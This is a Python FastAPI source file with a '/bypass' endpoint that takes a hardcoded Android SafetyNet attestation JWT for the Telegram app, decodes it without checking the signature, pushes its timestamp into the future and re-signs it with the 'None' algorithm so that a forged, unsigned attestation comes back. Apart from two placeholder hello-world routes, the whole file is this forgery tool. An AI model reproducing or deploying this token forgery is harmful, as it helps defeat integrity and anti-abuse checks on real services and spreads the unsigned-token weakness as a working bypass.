import base64
import json
import time

from fastapi import FastAPI
from pydantic import BaseModel
from starlette.responses import HTMLResponse

app = FastAPI()


@app.get("/")
async def root():
    return {"message": "Hello World"}


@app.get("/hello/{name}")
async def say_hello(name: str):
    return {"message": f"Hello {name}"}

class BypassData(BaseModel):
    nonce: bytes

@app.post('/bypass/{token}')
async def bypass():
    import jwt

    # Paste JWT token here
    token = 'eyJhbGciOiJSUzI1NiIsIng1YyI6WyJNSUlGYmpDQ0JGYWdBd0lCQWdJUkFPeEZGOHJKdmRhS0NlMU5VMXVycFpvd0RRWUpLb1pJaHZjTkFRRUxCUUF3UmpFTE1Ba0dBMVVFQmhNQ1ZWTXhJakFnQmdOVkJBb1RHVWR2YjJkc1pTQlVjblZ6ZENCVFpYSjJhV05sY3lCTVRFTXhFekFSQmdOVkJBTVRDa2RVVXlCRFFTQXhSRFF3SGhjTk1qTXhNREExTVRVd016UTVXaGNOTWpRd01UQXpNVFV3TXpRNFdqQWRNUnN3R1FZRFZRUURFeEpoZEhSbGMzUXVZVzVrY205cFpDNWpiMjB3Z2dFaU1BMEdDU3FHU0liM0RRRUJBUVVBQTRJQkR3QXdnZ0VLQW9JQkFRQzd3Y0ZaSVdhdXBPMVB6VkN5dWI2ZTFSN1l1RVJycDRITVE3ME1acGVJdmtWTVRtNkZRYk9iaGYrQjVEMmo5OTFESHdMaXZHN2I4MmZPVDJncDR5TFhYUEdzM1p3cmttTnRubnFmeDAwbTJkc2xFUmc3VmxtRm03Q2I2Wm5wZXdvRlZXUTg3aVFSWC9VNjdqVGFSRys5MllNVWZlaFdvVUQ1VGZETG9SbDNRVDlrWloyWnRreWFyVVpOMkhJK1dMdzlBWlNDQUI5cm5wREk5WVdseVh4WFBxRFpFVG5BamVzakdtZUNGQmJFRFZ6WUVDQkxuSjZLWlJVTmlRb0R3QU4xc0FsWjVzNWtFNFBHUXNUZlJFWi9nUzVkenVXVUZiMEdUZWxzY0pUSGsyNEVPZnR6ZERGOEcvbVJjTXRFQU4xNklEQ0ltdVNadW85ODJuaVdJRlNwQWdNQkFBR2pnZ0orTUlJQ2VqQU9CZ05WSFE4QkFmOEVCQU1DQmFBd0V3WURWUjBsQkF3d0NnWUlLd1lCQlFVSEF3RXdEQVlEVlIwVEFRSC9CQUl3QURBZEJnTlZIUTRFRmdRVWhwSzZabXhONkdCNG44T05KL1JSemZ6bHlYUXdId1lEVlIwakJCZ3dGb0FVSmVJWURySlhrWlFxNWRSZGhwQ0QzbE96dUpJd2V3WUlLd1lCQlFVSEFRRUViekJ0TURnR0NDc0dBUVVGQnpBQmhpeG9kSFJ3T2k4dmIyTnpjQzV3YTJrdVoyOXZaeTl6TDJkMGN6RmtOR2x1ZEM4NGFtUmtjakJETkhoR2N6QXhCZ2dyQmdFRkJRY3dBb1lsYUhSMGNEb3ZMM0JyYVM1bmIyOW5MM0psY0c4dlkyVnlkSE12WjNSek1XUTBMbVJsY2pBZEJnTlZIUkVFRmpBVWdoSmhkSFJsYzNRdVlXNWtjbTlwWkM1amIyMHdJUVlEVlIwZ0JCb3dHREFJQmdabmdRd0JBZ0V3REFZS0t3WUJCQUhXZVFJRkF6QS9CZ05WSFI4RU9EQTJNRFNnTXFBd2hpNW9kSFJ3T2k4dlkzSnNjeTV3YTJrdVoyOXZaeTluZEhNeFpEUnBiblF2V0RKS01raHlYemRRYVUwdVkzSnNNSUlCQXdZS0t3WUJCQUhXZVFJRUFnU0I5QVNCOFFEdkFIWUFkditJUHdxMis1VlJ3bUhNOVllNk5MU2t6YnNwM0doQ0NwL21aMHhhT25RQUFBR0xBSlRhNUFBQUJBTUFSekJGQWlFQWwyNjlqSHE4eXhHR1JCTkphdEI5YzZjMi9hVnBYb1VNalZDU1FpSTZtNVFDSUVEc0dpdzFsS1pNVC94SHhKZ051TG9adWhSZlhuZ2xJa3lWSmo5ZXpYZ2ZBSFVBMnJhL2F6KzF0aUtmbThLN1hHdm9jSkZ4Ykx0UmhJVTB2YVE5TUVqWCs2c0FBQUdMQUpUYTd3QUFCQU1BUmpCRUFpQkhFd05kbEE0NHZrd2Zkd3lndytjdkphSDlqUXVVOVl2VXFrcENqUzByZGdJZ1VUOVozMXp0ck1hRStkakJyMDVvQXNsSTdjVkQ3aXlZY1liVTd1QVBvM013RFFZSktvWklodmNOQVFFTEJRQURnZ0VCQUVPQ0xqek90R1FXaFFXd3pFSENoaUdNOHdZcEZEZCs1MlZoTFFKSnk2ZUJnRVZXUUFDSUViWk5iSjVMNm5saXBUR0NxQ01zQ3paSjluTlJId1VKTlZkVVJjVmFTQ2hDN2JkM2pjYUprVFFYWElGSmRVZXZLdTloeDYxYTlxeFNDZmFZTzRncHplaTJIVk9zemRrTnk3cU44OGlDS1pKaGxDOEpYb1pVWE9PSWRvanZjemRyVTBCMXhxZ2tnSHhETXBiYkdOTGIzSUN4NjhhZWt2UCtLODlESFh6bi9laXNlS0JoZnhQRldBYWVJdHgzVkpqM1BLc2F0azdxYjBoS1dRRThKTXhPN0ZLRW43TkUyYTBxZVpNNTQyUEtheXZBSHgzUVlSNGI0aHZqVnlMQ0sxQWdrOUxROWIxczJ5cjFXbm1WcS9vMXIvRTZMdzBZRWI2TmVzQT0iLCJNSUlGakRDQ0EzU2dBd0lCQWdJTkFnQ09zZ0l6Tm1XTFpNM2JtekFOQmdrcWhraUc5dzBCQVFzRkFEQkhNUXN3Q1FZRFZRUUdFd0pWVXpFaU1DQUdBMVVFQ2hNWlIyOXZaMnhsSUZSeWRYTjBJRk5sY25acFkyVnpJRXhNUXpFVU1CSUdBMVVFQXhNTFIxUlRJRkp2YjNRZ1VqRXdIaGNOTWpBd09ERXpNREF3TURReVdoY05NamN3T1RNd01EQXdNRFF5V2pCR01Rc3dDUVlEVlFRR0V3SlZVekVpTUNBR0ExVUVDaE1aUjI5dloyeGxJRlJ5ZFhOMElGTmxjblpwWTJWeklFeE1RekVUTUJFR0ExVUVBeE1LUjFSVElFTkJJREZFTkRDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBS3ZBcXFQQ0UyN2wwdzl6QzhkVFBJRTg5YkEreFRtRGFHN3k3VmZRNGMrbU9XaGxVZWJVUXBLMHl2MnI2NzhSSkV4SzBIV0RqZXErbkxJSE4xRW01ajZyQVJaaXhteVJTamhJUjBLT1FQR0JNVWxkc2F6dElJSjdPMGcvODJxai92R0RsLy8zdDR0VHF4aVJoTFFuVExYSmRlQisyRGhrZFU2SUlneDZ3TjdFNU5jVUgzUmNzZWpjcWo4cDVTajE5dkJtNmkxRmhxTEd5bWhNRnJvV1ZVR08zeHRJSDkxZHNneTRlRktjZktWTFdLM28yMTkwUTBMbS9TaUttTGJSSjVBdTR5MWV1RkptMkpNOWVCODRGa3FhM2l2clhXVWVWdHllMENRZEt2c1kyRmthenZ4dHh2dXNMSnpMV1lIazU1emNSQWFjREEyU2VFdEJiUWZEMXFzQ0F3RUFBYU9DQVhZd2dnRnlNQTRHQTFVZER3RUIvd1FFQXdJQmhqQWRCZ05WSFNVRUZqQVVCZ2dyQmdFRkJRY0RBUVlJS3dZQkJRVUhBd0l3RWdZRFZSMFRBUUgvQkFnd0JnRUIvd0lCQURBZEJnTlZIUTRFRmdRVUplSVlEckpYa1pRcTVkUmRocENEM2xPenVKSXdId1lEVlIwakJCZ3dGb0FVNUs4ckpuRWFLMGduaFM5U1ppenY4SWtUY1Q0d2FBWUlLd1lCQlFVSEFRRUVYREJhTUNZR0NDc0dBUVVGQnpBQmhocG9kSFJ3T2k4dmIyTnpjQzV3YTJrdVoyOXZaeTluZEhOeU1UQXdCZ2dyQmdFRkJRY3dBb1lrYUhSMGNEb3ZMM0JyYVM1bmIyOW5MM0psY0c4dlkyVnlkSE12WjNSemNqRXVaR1Z5TURRR0ExVWRId1F0TUNzd0thQW5vQ1dHSTJoMGRIQTZMeTlqY213dWNHdHBMbWR2YjJjdlozUnpjakV2WjNSemNqRXVZM0pzTUUwR0ExVWRJQVJHTUVRd0NBWUdaNEVNQVFJQk1EZ0dDaXNHQVFRQjFua0NCUU13S2pBb0JnZ3JCZ0VGQlFjQ0FSWWNhSFIwY0hNNkx5OXdhMmt1WjI5dlp5OXlaWEJ2YzJsMGIzSjVMekFOQmdrcWhraUc5dzBCQVFzRkFBT0NBZ0VBSVZUb3kyNGp3WFVyMHJBUGM5MjR2dVNWYktRdVl3M25MZmxMZkxoNUFZV0VlVmwvRHUxOFFBV1VNZGNKNm8vcUZaYmhYa0JIMFBOY3c5N3RoYWYyQmVvRFlZOUNrL2IrVUdsdWh4MDZ6ZDRFQmY3SDlQODRubnJ3cFIrNEdCRFpLK1hoM0kwdHFKeTJyZ09xTkRmbHI1SU1ROFpUV0EzeWx0YWt6U0JLWjZYcEYwUHBxeUNSdnAvTkNHdjJLWDJUdVBDSnZzY3AxL20ycFZUdHlCallQUlErUXVDUUdBSktqdE43UjVERnJmVHFNV3ZZZ1ZscENKQmt3bHU3KzdLWTNjVElmekU3Y21BTHNrTUtOTHVEeitSekNjc1lUc1ZhVTdWcDN4TDYwT1locUZrdUFPT3hEWjZwSE9qOStPSm1ZZ1BtT1Q0WDMrN0w1MWZYSnlSSDlLZkxSUDZuVDMxRDVubXNHQU9nWjI2LzhUOWhzQlcxdW85anU1ZlpMWlhWVlM1SDBIeUlCTUVLeUdNSVBoRldybHQvaEZTMjhOMXphS0kwWkJHRDNnWWdETGJpRFQ5ZkdYc3RwaytGbWM0b2xWbFdQelhlODF2ZG9FbkZicjVNMjcySGRnSldvK1doVDlCWU0wSmkrd2RWbW5SZmZYZ2xvRW9sdVROY1d6YzQxZEZwZ0p1OGZGM0xHMGdsMmliU1lpQ2k5YTZodlUwVHBwakp5SVdYaGtKVGNNSmxQcld4MVZ5dEVVR3JYMmwwSkR3UmpXLzY1NnIwS1ZCMDJ4SFJLdm0yWktJMDNUZ2xMSXBtVkNLM2tCS2tLTnBCTmtGdDhyaGFmY0NLT2I5SngvOXRwTkZsUVRsN0IzOXJKbEpXa1IxN1FuWnFWcHRGZVBGT1JvWm1Gek09IiwiTUlJRllqQ0NCRXFnQXdJQkFnSVFkNzBOYk5zMitScnFJUS9FOEZqVERUQU5CZ2txaGtpRzl3MEJBUXNGQURCWE1Rc3dDUVlEVlFRR0V3SkNSVEVaTUJjR0ExVUVDaE1RUjJ4dlltRnNVMmxuYmlCdWRpMXpZVEVRTUE0R0ExVUVDeE1IVW05dmRDQkRRVEViTUJrR0ExVUVBeE1TUjJ4dlltRnNVMmxuYmlCU2IyOTBJRU5CTUI0WERUSXdNRFl4T1RBd01EQTBNbG9YRFRJNE1ERXlPREF3TURBME1sb3dSekVMTUFrR0ExVUVCaE1DVlZNeElqQWdCZ05WQkFvVEdVZHZiMmRzWlNCVWNuVnpkQ0JUWlhKMmFXTmxjeUJNVEVNeEZEQVNCZ05WQkFNVEMwZFVVeUJTYjI5MElGSXhNSUlDSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQWc4QU1JSUNDZ0tDQWdFQXRoRUNpeDdqb1hlYk85eS9sRDYzbGFkQVBLSDlndmw5TWdhQ2NmYjJqSC83Nk51OGFpNlhsNk9NUy9rcjlySDV6b1Fkc2ZuRmw5N3Z1ZktqNmJ3U2lWNm5xbEtyK0NNbnk2U3huR1BiMTVsKzhBcGU2MmltOU1aYVJ3MU5FRFBqVHJFVG84Z1liRXZzL0FtUTM1MWtLU1VqQjZHMDBqMHVZT0RQMGdtSHU4MUk4RTNDd25xSWlydTZ6MWtaMXErUHNBZXduakh4Z3NIQTN5Nm1iV3daRHJYWWZpWWFSUU05c0hta2xDaXREMzhtNWFnSS9wYm9QR2lVVSs2RE9vZ3JGWllKc3VCNmpDNTExcHpycDFaa2o1WlBhSzQ5bDhLRWo4QzhRTUFMWEwzMmg3TTFiS3dZVUgrRTRFek5rdE1nNlRPOFVwbXZNclVwc3lVcXRFajVjdUhLWlBmbWdoQ042SjNDaW9qNk9HYUsvR1A1QWZsNC9YdGNkL3AyaC9yczM3RU9lWlZYdEwwbTc5WUIwZXNXQ3J1T0M3WEZ4WXBWcTlPczZwRkxLY3dacERJbFRpcnhaVVRRQXM2cXprbTA2cDk4ZzdCQWUrZERxNmRzbzQ5OWlZSDZUS1gvMVk3RHprdmd0ZGl6amtYUGRzRHRRQ3Y5VXcrd3A5VTdEYkdLb2dQZU1hM01kK3B2ZXo3VzM1RWlFdWErK3RneS9CQmpGRkZ5M2wzV0ZwTzlLV2d6N3pwbTdBZUtKdDhUMTFkbGVDZmVYa2tVQUtJQWY1cW9JYmFwc1pXd3Bia05GaEhheDJ4SVBFRGdmZzFhelZZODBaY0Z1Y3RMN1RsTG5NUS8wbFVUYmlTdzFuSDY5TUc2ek8wYjlmNkJRZGdBbUQwNnlLNTZtRGNZQlpVQ0F3RUFBYU9DQVRnd2dnRTBNQTRHQTFVZER3RUIvd1FFQXdJQmhqQVBCZ05WSFJNQkFmOEVCVEFEQVFIL01CMEdBMVVkRGdRV0JCVGtyeXNtY1JvclNDZUZMMUptTE8vd2lSTnhQakFmQmdOVkhTTUVHREFXZ0JSZ2UyWWFSUTJYeW9sUUwzMEV6VFNvLy96OVN6QmdCZ2dyQmdFRkJRY0JBUVJVTUZJd0pRWUlLd1lCQlFVSE1BR0dHV2gwZEhBNkx5OXZZM053TG5CcmFTNW5iMjluTDJkemNqRXdLUVlJS3dZQkJRVUhNQUtHSFdoMGRIQTZMeTl3YTJrdVoyOXZaeTluYzNJeEwyZHpjakV1WTNKME1ESUdBMVVkSHdRck1Da3dKNkFsb0NPR0lXaDBkSEE2THk5amNtd3VjR3RwTG1kdmIyY3ZaM055TVM5bmMzSXhMbU55YkRBN0JnTlZIU0FFTkRBeU1BZ0dCbWVCREFFQ0FUQUlCZ1puZ1F3QkFnSXdEUVlMS3dZQkJBSFdlUUlGQXdJd0RRWUxLd1lCQkFIV2VRSUZBd013RFFZSktvWklodmNOQVFFTEJRQURnZ0VCQURTa0hyRW9vOUMwZGhlbU1Yb2g2ZEZTUHNqYmRCWkJpTGc5TlIzdDVQK1Q0VnhmcTd2cWZNL2I1QTNSaTFmeUptOWJ2aGRHYUpRM2IydDZ5TUFZTi9vbFVhenNhTCt5eUVuOVdwcktBU09zaElBckFveVpsK3RKYW94MTE4ZmVzc21YbjFoSVZ3NDFvZVFhMXYxdmc0RnY3NHpQbDYvQWhTcnc5VTVwQ1pFdDRXaTR3U3R6NmRUWi9DTEFOeDhMWmgxSjdRSlZqMmZoTXRmVEpyOXc0ejMwWjIwOWZPVTBpT015K3FkdUJtcHZ2WXVSN2haTDZEdXBzemZudzBTa2Z0aHMxOGRHOVpLYjU5VWh2bWFTR1pSVmJOUXBzZzNCWmx2aWQwbElLTzJkMXhvemNsT3pnalhQWW92SkpJdWx0emtNdTM0cVFiOVN6L3lpbHJiQ2dqOD0iXX0.eyJub25jZSI6Ikt6WXlPRE00T0RjNU5qVXpNUT09IiwidGltZXN0YW1wTXMiOjE3MDIyMDk5ODQ3OTQsImFwa1BhY2thZ2VOYW1lIjoib3JnLnRlbGVncmFtLm1lc3NlbmdlciIsImFwa0RpZ2VzdFNoYTI1NiI6ImY2M1VEaWVzRTNyNis5QkhaS2pGdHY5N0FpRVRWVVFNODJINUVJbkVaMmM9IiwiY3RzUHJvZmlsZU1hdGNoIjp0cnVlLCJhcGtDZXJ0aWZpY2F0ZURpZ2VzdFNoYTI1NiI6WyJTY0ZTSlVqcnJOUnM0eUsyL1VmMkNTdTNSZEQ0Z0lJVVhLODE0VTNNT09FPSJdLCJiYXNpY0ludGVncml0eSI6dHJ1ZSwiZXZhbHVhdGlvblR5cGUiOiJCQVNJQyIsImRlcHJlY2F0aW9uSW5mb3JtYXRpb24iOiJUaGUgYXBwIGlzIG5vdCBhbGxvd2xpc3RlZCB0byB1c2UgdGhlIFNhZmV0eU5ldCBBdHRlc3RhdGlvbiBBUEkuIFlvdSBuZWVkIHRvIG1pZ3JhdGUgdG8gdGhlIFBsYXkgSW50ZWdyaXR5IEFQSSBieSB0aGUgbWlncmF0aW9uIGRlYWRsaW5lOiBodHRwczovL2cuY28vcGxheS9zYWZldHluZXQtdGltZWxpbmUuIn0.W3wlzAM3Jr4CfG4IBw7_hNg9ktU65Qg7dexfS2fAtAY2wmcRmlWnNra7SLuK3abSvMsCyHlsrO7SbjpSZNqpTvjwjrKm_iXetw1GjjQbADynq6Kf2akSsuY7vzuJDV9NPwq1CeoRYMqTS2yd8mceCWTNjINWYTvk-okQ9Ydtx4XQVdtUIQELUvchb5tL5b57TgPrxH2aPU0USo5A592rdz7OoERCF7FQZuEnmq1_HQHUJyGxJgFnHecivyEhDtHyAOvrnNAiJBmSmkEg7blq9KlsgFcrVHDyQVcVBa2ggQR43YQgBlVxA8I1nN8QvjuQvA7C0r_Xt6PgYLar4BrFPA'

    # Decode the token (without verifying)
    decoded_token = jwt.decode(token, options={"verify_signature": False})
    print(f"Decoded token: {decoded_token}\n")

    # Modify the token (JWT manipulation)
    decoded_token['timestampMs'] = 1802209984794
    print(f"Modified payload: {decoded_token}\n")

    # Generate a new token with the modified payload (re-encode)
    # Re-encode the JWT with None algorithm
    modified_token = jwt.encode(decoded_token, None, algorithm=None)
    print(f"Modified token: {modified_token}\n")
    return HTMLResponse(content=modified_token, status_code=200)
